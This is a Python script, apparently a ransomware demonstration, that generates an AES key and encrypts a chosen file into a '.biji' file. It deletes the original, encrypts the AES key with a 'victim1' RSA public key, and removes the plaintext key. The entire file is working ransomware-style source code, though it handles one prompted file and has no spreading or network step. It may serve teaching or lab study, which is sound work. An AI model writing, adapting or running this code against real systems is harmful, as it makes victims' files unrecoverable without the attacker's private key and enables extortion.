from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import os
import base64

# Function to generate a random 256-bit AES key
def generate_aes_key():
    aes_key = os.urandom(32)  # 256-bit AES key
    with open("victim1_aes_file_encryption.bin", "wb") as aes_key_file:
        aes_key_file.write(aes_key)
    print(">> AES file encryption key 'victim1_aes_file_encryption.bin' has been generated.")
    return aes_key

# Function to encrypt a file using AES
def encrypt_file_using_aes(file_path, aes_key):
    # Generate a random IV for AES-CBC mode
    iv = os.urandom(16)  # AES block size for CBC mode
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Read the file to encrypt
    with open(file_path, "rb") as file:
        file_data = file.read()

    # Pad the data to be a multiple of 16 bytes (AES block size)
    pad_len = 16 - len(file_data) % 16
    padded_data = file_data + bytes([pad_len]) * pad_len

    # Encrypt the file data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Create the encrypted file with .biji extension
    encrypted_file_path = f"{file_path}.biji"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(iv + encrypted_data)  # Prepend IV to the encrypted data

    print(f">> File '{file_path}' has been encrypted and saved as '{encrypted_file_path}'.")

    # Delete the original file after encryption
    os.remove(file_path)
    print(f"!! Original file '{file_path}' has been deleted after encryption.")

# Function to encrypt the AES key with RSA public key (victim1_public_key.pem)
def encrypt_aes_key_with_rsa(aes_key):
    # Load the RSA public key from victim1_public_key.pem
    with open("victim1_public_key.pem", "rb") as public_key_file:
        public_key = serialization.load_pem_public_key(public_key_file.read())

    # Encrypt the AES key using RSA public key (OAEP padding)
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted AES key to a file
    with open("victim1_aes_file_encryption.bin.encrypted", "wb") as encrypted_key_file:
        encrypted_key_file.write(encrypted_aes_key)

    print(">> AES encryption key 'victim1_aes_file_encryption.bin' has been encrypted with the RSA public key 'victim1_public_key.pem' and saved as 'victim1_aes_file_encryption.bin.encrypted'.")

    # Delete the AES key file after encryption
    os.remove("victim1_aes_file_encryption.bin")
    print("!! Original key file 'victim1_aes_file_encryption.bin' has been deleted after encryption.")

# Main function
def main():
    # Step 1: Generate AES key
    aes_key = generate_aes_key()

    # Step 2: Prompt user to choose a file to encrypt
    file_to_encrypt = input("== Enter the name of the file you want to encrypt: ")

    if not os.path.isfile(file_to_encrypt):
        print(">> The specified file does not exist. Exiting...")
        return

    # Step 3: Encrypt the chosen file using AES
    encrypt_file_using_aes(file_to_encrypt, aes_key)

    # Step 4: Encrypt the AES key using the RSA public key (victim1_public_key.pem)
    encrypt_aes_key_with_rsa(aes_key)

if __name__ == "__main__":
    main()
